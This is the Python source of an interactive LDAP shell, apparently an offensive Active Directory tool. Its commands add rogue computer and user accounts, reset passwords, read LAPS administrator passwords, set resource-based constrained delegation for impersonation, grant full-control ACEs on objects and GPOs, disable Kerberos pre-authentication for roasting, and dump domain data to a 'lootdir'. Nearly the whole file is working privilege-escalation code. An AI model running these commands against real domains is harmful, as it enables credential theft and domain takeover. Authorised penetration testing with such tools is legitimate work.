"""
Main file.
"""
import cmd
import logging
import random
import re
import shlex
import string

import ldap3
from ldap3.core.results import RESULT_UNWILLING_TO_PERFORM
from ldap3.protocol.microsoft import security_descriptor_control
from ldap3.utils.conv import escape_filter_chars

from ldap_shell import ldaptypes

log = logging.getLogger('ldap-shell.shell')


# noinspection PyMissingOrEmptyDocstring,PyPep8Naming,PyUnusedLocal
class LdapShell(cmd.Cmd):
    LDAP_MATCHING_RULE_IN_CHAIN = '1.2.840.113556.1.4.1941'

    def __init__(self, stdin, stdout, domain_dumper, client):
        super().__init__(stdin=stdin, stdout=stdout)

        self.use_rawinput = False

        self.prompt = '\n# '
        self.tid = None
        self.intro = 'Type help for list of commands'
        self.loggedIn = True
        self.last_output = None
        self.completion = []
        self.client = client
        self.domain_dumper = domain_dumper

    def process_error_response(self):
        if self.client.result['result'] == 50:
            raise Exception(
                f'Could not modify object, the server reports insufficient rights: {self.client.result["message"]}')
        elif self.client.result['result'] == 19:
            raise Exception(
                f'Could not modify object, the server reports a constrained violation: {self.client.result["message"]}')
        else:
            raise Exception(f'The server returned an error: {self.client.result["message"]}')

    def emptyline(self) -> bool:
        pass

    def onecmd(self, line: str) -> bool:
        ret_val = False
        # noinspection PyBroadException
        try:
            ret_val = super().onecmd(line)
        except Exception:
            log.error('Failed to execute onecmd()', exc_info=True)
        return ret_val

    @staticmethod
    def create_empty_sd():
        sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
        sd['Revision'] = b'\x01'
        sd['Sbz1'] = b'\x00'
        sd['Control'] = 32772
        sd['OwnerSid'] = ldaptypes.LDAP_SID()
        # BUILTIN\Administrators
        sd['OwnerSid'].fromCanonical('S-1-5-32-544')
        sd['GroupSid'] = b''
        sd['Sacl'] = b''
        acl = ldaptypes.ACL()
        acl['AclRevision'] = 4
        acl['Sbz1'] = 0
        acl['Sbz2'] = 0
        acl.aces = []
        sd['Dacl'] = acl
        return sd

    @staticmethod
    def create_allow_ace(sid):
        nace = ldaptypes.ACE()
        nace['AceType'] = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE
        nace['AceFlags'] = 0x00
        acedata = ldaptypes.ACCESS_ALLOWED_ACE()
        acedata['Mask'] = ldaptypes.ACCESS_MASK()
        acedata['Mask']['Mask'] = 983551  # Full control
        acedata['Sid'] = ldaptypes.LDAP_SID()
        acedata['Sid'].fromCanonical(sid)
        nace['Ace'] = acedata
        return nace

    def do_write_gpo_dacl(self, line):
        args = shlex.split(line)
        log.info('Adding %s to GPO with GUID %s', args[0], args[1])
        if len(args) != 2:
            raise Exception('A samaccountname and GPO sid are required.')

        tgtUser = args[0]
        gposid = args[1]
        self.client.search(self.domain_dumper.root, f'(&(objectclass=person)(sAMAccountName={tgtUser}))',
                           attributes=['objectSid'])
        if len(self.client.entries) <= 0:
            raise Exception('Given user not found')

        user = self.client.entries[0]

        controls = security_descriptor_control(sdflags=0x04)
        self.client.search(self.domain_dumper.root, f'(&(objectclass=groupPolicyContainer)(name={gposid}))',
                           attributes=['objectSid', 'nTSecurityDescriptor'], controls=controls)

        if len(self.client.entries) <= 0:
            raise Exception('Given gpo not found')
        gpo = self.client.entries[0]

        secDescData = gpo['nTSecurityDescriptor'].raw_values[0]
        secDesc = ldaptypes.SR_SECURITY_DESCRIPTOR(data=secDescData)
        newace = self.create_allow_ace(str(user['objectSid']))
        secDesc['Dacl']['Data'].append(newace)
        data = secDesc.getData()

        self.client.modify(gpo.entry_dn, {'nTSecurityDescriptor': (ldap3.MODIFY_REPLACE, [data])}, controls=controls)
        if self.client.result["result"] == 0:
            log.info('LDAP server claims to have taken the secdescriptor. Have fun')
        else:
            raise Exception(f'Something went wrong: {self.client.result["description"]}')

    def do_add_computer(self, line):
        args = shlex.split(line)

        if not self.client.server.ssl:
            log.error('Error adding a new computer with LDAP requires LDAPS.')

        if len(args) != 1 and len(args) != 2:
            raise Exception('Expected a computer name and an optional password argument.')

        computer_name = args[0]
        if not computer_name.endswith('$'):
            computer_name += '$'

        log.info('Attempting to add a new computer with the name: %s', computer_name)

        if len(args) == 1:
            password = ''.join(
                random.choice(string.ascii_letters + string.digits + string.punctuation) for _ in range(15))
        else:
            password = args[1]

        domain_dn = self.domain_dumper.root
        domain = re.sub(',DC=', '.', domain_dn[domain_dn.find('DC='):], flags=re.I)[3:]

        log.info('Inferred Domain DN: %s', domain_dn)
        log.info('Inferred Domain Name: %s', domain)

        computer_hostname = computer_name[:-1]  # Remove $ sign
        computer_dn = f"CN={computer_hostname},CN=Computers,{self.domain_dumper.root}"
        log.info('New Computer DN: %s', computer_dn)

        spns = [
            f'HOST/{computer_hostname}',
            f'HOST/{computer_hostname}.{domain}',
            f'RestrictedKrbHost/{computer_hostname}',
            f'RestrictedKrbHost/{computer_hostname}.{domain}',
        ]
        ucd = {
            'dnsHostName': f'{computer_hostname}.{domain}',
            'userAccountControl': 4096,
            'servicePrincipalName': spns,
            'sAMAccountName': computer_name,
            'unicodePwd': '"{}"'.format(password).encode('utf-16-le')
        }

        res = self.client.add(computer_dn, ['top', 'person', 'organizationalPerson', 'user', 'computer'], ucd)

        if not res:
            if self.client.result['result'] == RESULT_UNWILLING_TO_PERFORM:
                log.error('Failed to add a new computer. The server denied the operation.')
            else:
                log.error('Failed to add a new computer: %s', self.client.result)
        else:
            log.info('Adding new computer with username "%s" and password "%s" result: OK', computer_name, password)

    def do_del_computer(self, line):
        args = shlex.split(line)

        if not self.client.server.ssl:
            log.error('Error adding a new computer with LDAP requires LDAPS.')

        if len(args) != 1 and len(args) != 2:
            raise Exception('Expected a computer name and an optional password argument.')

        computer_name = args[0]
        if not computer_name.endswith('$'):
            computer_name += '$'

        log.info('Attempting to del a computer with the name: %s', computer_name)

        domain_dn = self.domain_dumper.root
        domain = re.sub(',DC=', '.', domain_dn[domain_dn.find('DC='):], flags=re.I)[3:]

        log.info('Inferred Domain DN: %s', domain_dn)
        log.info('Inferred Domain Name: %s', domain)

        computer_hostname = computer_name[:-1]  # Remove $ sign
        computer_dn = f"CN={computer_hostname},CN=Computers,{self.domain_dumper.root}"
        log.info('Del Computer DN: %s', computer_dn)

        res = self.client.delete(computer_dn)

        if not res:
            if self.client.result['result'] == RESULT_UNWILLING_TO_PERFORM:
                log.error('Failed to del a computer. The server denied the operation.')
            else:
                log.error('Failed to del a computer: %s', self.client.result)
        else:
            log.info('Deleting computer with name "%s" result: OK', computer_name)

    def do_add_user(self, line):
        args = shlex.split(line)
        if len(args) == 0:
            raise Exception('A username is required.')

        new_user = args[0]
        if len(args) == 1:
            parent_dn = f'CN=Users,{self.domain_dumper.root}'
        else:
            parent_dn = args[1]

        new_password = ''.join(
            random.choice(string.ascii_letters + string.digits + string.punctuation) for _ in range(15))

        new_user_dn = f'CN={new_user},{parent_dn}'
        ucd = {
            'objectCategory': f'CN=Person,CN=Schema,CN=Configuration,{self.domain_dumper.root}',
            'distinguishedName': new_user_dn,
            'cn': new_user,
            'sn': new_user,
            'givenName': new_user,
            'displayName': new_user,
            'name': new_user,
            'userAccountControl': 512,
            'accountExpires': '0',
            'sAMAccountName': new_user,
            'unicodePwd': '"{}"'.format(new_password).encode('utf-16-le')
        }

        log.info('Attempting to create user in: %s', parent_dn)
        res = self.client.add(new_user_dn, ['top', 'person', 'organizationalPerson', 'user'], ucd)
        if not res:
            if self.client.result['result'] == RESULT_UNWILLING_TO_PERFORM and not self.client.server.ssl:
                raise Exception(
                    'Failed to add a new user. The server denied the operation.'
                    ' Try relaying to LDAP with TLS enabled (ldaps) or escalating an existing user.')
            else:
                raise Exception(f'Failed to add a new user: {self.client.result["description"]}')
        else:
            log.info('Adding new user with username "%s" and password "%s" result: OK', new_user, new_password)

    def do_add_user_to_group(self, line):
        user_name, group_name = shlex.split(line)

        user_dn = self.get_dn(user_name)
        if not user_dn:
            raise Exception(f'User not found in LDAP: {user_name}')

        group_dn = self.get_dn(group_name)
        if not group_dn:
            raise Exception(f'Group not found in LDAP: {group_name}')

        user_name = user_dn.split(',')[0][3:]
        group_name = group_dn.split(',')[0][3:]

        res = self.client.modify(group_dn, {'member': [(ldap3.MODIFY_ADD, [user_dn])]})
        if res:
            log.info('Adding user "%s" to group "%s" result: OK', user_name, group_name)
        else:
            raise Exception(f'Failed to add user to group "{group_name}": {self.client.result["description"]}')

    def do_change_password(self, line):
        args = shlex.split(line)

        if len(args) != 1 and len(args) != 2:
            raise Exception(
                f'Expected a username and an optional password argument. Instead {len(args)} arguments were provided')

        user_dn = self.get_dn(args[0])
        log.info('Got User DN: %s', user_dn)

        if len(args) == 1:
            password = ''.join(
                random.choice(string.ascii_letters + string.digits + string.punctuation) for _ in range(15))
        else:
            password = args[1]

        log.info('Attempting to set new password of: %s', password)
        self.client.extend.microsoft.modify_password(user_dn, password)

        if self.client.result['result'] == 0:
            log.info('Password changed successfully!')
        else:
            self.process_error_response()

    def do_clear_rbcd(self, computer_name):
        success = self.client.search(self.domain_dumper.root, f'(sAMAccountName={escape_filter_chars(computer_name)})',
                                     attributes=['objectSid', 'msDS-AllowedToActOnBehalfOfOtherIdentity'])
        if not success or len(self.client.entries) != 1:
            raise Exception(f'Error expected only one search result, got {len(self.client.entries)} results')

        target = self.client.entries[0]
        target_sid = target['objectsid'].value
        log.info('Found Target DN: %s', target.entry_dn)
        log.info('Target SID: %s', target_sid)

        sd = self.create_empty_sd()

        self.client.modify(target.entry_dn,
                           {'msDS-AllowedToActOnBehalfOfOtherIdentity': [ldap3.MODIFY_REPLACE, [sd.getData()]]})
        if self.client.result['result'] == 0:
            log.info('Delegation rights cleared successfully!')
        else:
            self.process_error_response()

    def do_dump(self, line):
        log.info('Dumping domain info...')
        self.stdout.flush()
        self.domain_dumper.domainDump()
        log.info('Domain info dumped into lootdir (%s)!', self.domain_dumper.config.basepath.resolve())

    def do_disable_account(self, username):
        self.toggle_account_enable_disable(username, False)

    def do_enable_account(self, username):
        self.toggle_account_enable_disable(username, True)

    def toggle_account_enable_disable(self, user_name, enable):
        UF_ACCOUNT_DISABLE = 2
        self.client.search(self.domain_dumper.root, f'(sAMAccountName={escape_filter_chars(user_name)})',
                           attributes=['objectSid', 'userAccountControl'])

        if len(self.client.entries) != 1:
            raise Exception(f'Error expected only one search result got {len(self.client.entries)} results')

        user_dn = self.client.entries[0].entry_dn
        if not user_dn:
            raise Exception(f'User not found in LDAP: {user_name}')

        entry = self.client.entries[0]
        userAccountControl = entry['userAccountControl'].value

        log.info('Original userAccountControl: %s', userAccountControl)

        if enable:
            userAccountControl = userAccountControl & ~UF_ACCOUNT_DISABLE
        else:
            userAccountControl = userAccountControl | UF_ACCOUNT_DISABLE

        self.client.modify(user_dn, {'userAccountControl': (ldap3.MODIFY_REPLACE, [userAccountControl])})

        if self.client.result['result'] == 0:
            log.info('Updated userAccountControl attribute successfully')
        else:
            self.process_error_response()

    def do_search(self, line):
        arguments = shlex.split(line)
        if len(arguments) == 0:
            raise Exception('A query is required.')

        filter_attributes = ['name', 'distinguishedName', 'sAMAccountName']
        attributes = filter_attributes[:]
        attributes.append('objectSid')
        for argument in arguments[1:]:
            attributes.append(argument)

        search_query = ''.join(
            f'({attribute}=*{escape_filter_chars(arguments[0])}*)' for attribute in filter_attributes)
        self.search(f'(|{search_query})', *attributes)

    def do_set_dontreqpreauth(self, line):
        UF_DONT_REQUIRE_PREAUTH = 4194304

        args = shlex.split(line)
        if len(args) != 2:
            raise Exception('Username (SAMAccountName) and true/false flag required (e.g. jsmith true).')

        user_name = args[0]
        flag_str = args[1]

        if "true" == flag_str.lower():
            flag = True
        elif flag_str.lower() == 'false':
            flag = False
        else:
            raise Exception('The specified flag must be either true or false')

        self.client.search(self.domain_dumper.root, f'(sAMAccountName={escape_filter_chars(user_name)})',
                           attributes=['objectSid', 'userAccountControl'])
        if len(self.client.entries) != 1:
            raise Exception(f'Expected only one search result, got {len(self.client.entries)} results')

        user_dn = self.client.entries[0].entry_dn
        if not user_dn:
            raise Exception(f'User not found in LDAP: {user_name}')

        entry = self.client.entries[0]
        userAccountControl = entry['userAccountControl'].value
        log.info('Original userAccountControl: %s', userAccountControl)

        if flag:
            userAccountControl = userAccountControl | UF_DONT_REQUIRE_PREAUTH
        else:
            userAccountControl = userAccountControl & ~UF_DONT_REQUIRE_PREAUTH

        log.info('Updated userAccountControl: %s', userAccountControl)
        self.client.modify(user_dn, {'userAccountControl': (ldap3.MODIFY_REPLACE, [userAccountControl])})

        if self.client.result['result'] == 0:
            log.info('Updated userAccountControl attribute successfully')
        else:
            self.process_error_response()

    def do_get_user_groups(self, user_name):
        user_dn = self.get_dn(user_name)
        if not user_dn:
            raise Exception(f'User not found in LDAP: {user_name}')

        self.search(f'(member:{LdapShell.LDAP_MATCHING_RULE_IN_CHAIN}:={escape_filter_chars(user_dn)})')

    def do_get_group_users(self, group_name):
        group_dn = self.get_dn(group_name)
        if not group_dn:
            raise Exception(f'Group not found in LDAP: {group_name}')

        self.search(f'(memberof:{LdapShell.LDAP_MATCHING_RULE_IN_CHAIN}:={escape_filter_chars(group_dn)})',
                    'sAMAccountName', 'name')

    def do_get_laps_password(self, computer_name):

        self.client.search(self.domain_dumper.root, f'(sAMAccountName={escape_filter_chars(computer_name)})',
                           attributes=['ms-MCS-AdmPwd'])
        if len(self.client.entries) != 1:
            raise Exception(f'Error expected only one search result got {len(self.client.entries)} results')

        computer = self.client.entries[0]
        log.info('Found Computer DN: %s', computer.entry_dn)

        password = computer['ms-MCS-AdmPwd'].value

        if password is not None:
            log.info('LAPS Password: %s', password)
        else:
            log.info('Unable to Read LAPS Password for Computer')

    def do_grant_control(self, line):
        args = shlex.split(line)

        if len(args) != 1 and len(args) != 2:
            raise Exception(
                f'Expecting target and grantee names for RBCD attack. Received {len(args)} arguments instead.'
            )

        controls = security_descriptor_control(sdflags=0x04)

        target_name = args[0]
        grantee_name = args[1]

        success = self.client.search(self.domain_dumper.root, f'(sAMAccountName={escape_filter_chars(target_name)})',
                                     attributes=['objectSid', 'nTSecurityDescriptor'], controls=controls)
        if not success or len(self.client.entries) != 1:
            raise Exception(f'Error expected only one search result, got {len(self.client.entries)} results')

        target = self.client.entries[0]
        target_sid = target['objectSid'].value
        log.info('Found Target DN: %s', target.entry_dn)
        log.info('Target SID: %s', target_sid)

        success = self.client.search(self.domain_dumper.root, f'(sAMAccountName={escape_filter_chars(grantee_name)})',
                                     attributes=['objectSid'])
        if not success or len(self.client.entries) != 1:
            raise Exception(f'Error expected only one search result, got {len(self.client.entries)} results')

        grantee = self.client.entries[0]
        grantee_sid = grantee['objectSid'].value
        log.info('Found Grantee DN: %s', grantee.entry_dn)
        log.info('Grantee SID: %s', grantee_sid)

        try:
            sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=target['nTSecurityDescriptor'].raw_values[0])
        except IndexError:
            sd = self.create_empty_sd()

        sd['Dacl'].aces.append(self.create_allow_ace(grantee_sid))
        self.client.modify(target.entry_dn, {'nTSecurityDescriptor': [ldap3.MODIFY_REPLACE, [sd.getData()]]},
                           controls=controls)

        if self.client.result['result'] == 0:
            log.info('DACL modified successfully! %s now has control of %s', grantee_name, target_name)
        else:
            self.process_error_response()

    def do_set_rbcd(self, line):
        args = shlex.split(line)

        if len(args) != 1 and len(args) != 2:
            raise Exception(
                f'Expecting target and grantee names for RECD attack. Received {len(args)} arguments instead.')

        target_name = args[0]
        grantee_name = args[1]

        success = self.client.search(self.domain_dumper.root, f'(sAMAccountName={escape_filter_chars(target_name)})',
                                     attributes=['objectSid', 'msDS-AllowedToActOnBehalfOfOtherIdentity'])
        if not success or len(self.client.entries) != 1:
            raise Exception(f'Expected only one search result, got {len(self.client.entries)} results')

        target = self.client.entries[0]
        target_sid = target['objectSid'].value
        log.info('Found Target DN: %s', target.entry_dn)
        log.info('Target SID: %s', target_sid)

        success = self.client.search(self.domain_dumper.root, f'(sAMAccountName={escape_filter_chars(grantee_name)})',
                                     attributes=['objectSid'])
        if success is False or len(self.client.entries) != 1:
            raise Exception(f'Expected only one search result, got {len(self.client.entries)} results')

        grantee = self.client.entries[0]
        grantee_sid = grantee['objectSid'].value
        log.info('Found Grantee DN: %s', grantee.entry_dn)
        log.info('Grantee SID: %s', grantee_sid)

        try:
            sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=target['msDS-AllowedToActOnBehalfOfOtherIdentity'].raw_values[0])
            log.info('Currently allowed sids:')
            for ace in sd['Dacl'].aces:
                log.info('\t%s', ace['Ace']['Sid'].formatCanonical())

                if ace['Ace']['Sid'].formatCanonical() == grantee_sid:
                    log.warning('Grantee is already permitted to perform delegation to the target host, aborting')
                    return

        except IndexError:
            sd = self.create_empty_sd()

        sd['Dacl'].aces.append(self.create_allow_ace(grantee_sid))
        self.client.modify(target.entry_dn,
                           {'msDS-AllowedToActOnBehalfOfOtherIdentity': [ldap3.MODIFY_REPLACE, [sd.getData()]]})

        if self.client.result['result'] == 0:
            log.info('Delegation rights modified successfully! %s can now impersonate users on %s via S4U2Proxy',
                     grantee_name, target_name)
        else:
            self.process_error_response()

    def search(self, query, *attributes):
        self.client.search(self.domain_dumper.root, query, attributes=attributes)
        for entry in self.client.entries:
            log.info('Search - %s', entry.entry_dn)
            for attribute in attributes:
                value = entry[attribute].value
                if value:
                    log.info('Search - %s: %s', attribute, entry[attribute].value)
            if any(attributes):
                log.info('---')

    def get_dn(self, sam_name):
        if ',' in sam_name:
            return sam_name

        try:
            self.client.search(self.domain_dumper.root, f'(sAMAccountName={escape_filter_chars(sam_name)})',
                               attributes=['objectSid'])
            return self.client.entries[0].entry_dn
        except IndexError:
            return None

    def do_exit(self, line):
        return True

    def do_help(self, line):
        print('''
add_computer computer [password] - Adds a new computer to the domain with the specified password. Requires LDAPS.
add_user new_user [parent] - Creates a new user.
add_user_to_group user group - Adds a user to a group.
change_password user [password] - Attempt to change a given user's password. Requires LDAPS.
clear_rbcd target - Clear the resource based constrained delegation configuration information.
disable_account user - Disable the user's account.
enable_account user - Enable the user's account.
dump - Dumps the domain.
search query [attributes,] - Search users and groups by name, distinguishedName and sAMAccountName.
get_user_groups user - Retrieves all groups this user is a member of.
get_group_users group - Retrieves all members of a group.
get_laps_password computer - Retrieves the LAPS passwords associated with a given computer (sAMAccountName).
grant_control target grantee - Grant full control of a given target object (sAMAccountName) to the grantee (sAMAccountName).
set_dontreqpreauth user true/false - Set the don't require pre-authentication flag to true or false.
set_rbcd target grantee - Grant the grantee (sAMAccountName) the ability to perform RBCD to the target (sAMAccountName).
write_gpo_dacl user gpoSID - Write a full control ACE to the gpo for the given user. The gpoSID must be entered surrounding by {}.
exit - Terminates this session.''')

    def do_EOF(self, line):
        log.warning('Bye!')
        return True
